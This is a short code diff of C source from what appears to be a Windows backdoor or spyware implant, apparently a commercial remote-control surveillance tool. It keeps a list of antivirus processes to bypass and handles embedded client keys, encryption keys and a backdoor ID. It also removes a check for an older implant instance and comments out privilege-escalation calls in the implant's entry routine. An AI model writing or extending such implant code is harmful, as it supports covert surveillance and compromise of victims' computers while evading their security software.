@@ -23,14 +23,6 @@ WCHAR *process_bypassed[] = {L"avgscanx64.exe",
                              L"fsscoepl_x64.exe", 
 							 NULL };
 
-/*#define OLD_SHARE_MEMORY_READ_NAME "KB037H1"
-BOOL IsThereOldRCS()
-{
-	HANDLE hfile;
-	if (hfile = OpenFileMapping(FILE_MAP_READ, FALSE, OLD_SHARE_MEMORY_READ_NAME))
-		return TRUE;
-}*/
-
 void SetGlobalVariables()
 {
 	HANDLE hfile;
@@ -71,11 +63,11 @@ void SetGlobalVariables()
 
 	// Inseriti solo per usarli
 	char dummy[256];
-	_snprintf_s(dummy, 256, _TRUNCATE, "%s", CLIENT_KEY);
-	_snprintf_s(dummy, 256, _TRUNCATE, "%s", ENCRYPTION_KEY);
-	_snprintf_s(dummy, 256, _TRUNCATE, "%s", ENCRYPTION_KEY_CONF);
-	_snprintf_s(dummy, 256, _TRUNCATE, "%s", BACKDOOR_ID);
-	_snprintf_s(dummy, 256, _TRUNCATE, "%s", DEMO_TAG);
+	_snprintf_s(dummy, 50, _TRUNCATE, "%s", CLIENT_KEY);
+	_snprintf_s(dummy, 50, _TRUNCATE, "%s", ENCRYPTION_KEY);
+	_snprintf_s(dummy, 50, _TRUNCATE, "%s", ENCRYPTION_KEY_CONF);
+	_snprintf_s(dummy, 50, _TRUNCATE, "%s", BACKDOOR_ID);
+	_snprintf_s(dummy, 50, _TRUNCATE, "%s", DEMO_TAG);
 }
 
 // Accetta sia il nome che il path del processo
@@ -158,7 +150,7 @@ void StartPolling(void)
 void __stdcall H64_sMain(void)
 {
 	SetGlobalVariables();
-	GetAdmin(GetCurrentProcessId());
-	GetAdmin(g_core_pid);
+	//GetAdmin(GetCurrentProcessId());
+	//GetAdmin(g_core_pid);
 	StartPolling();
 }
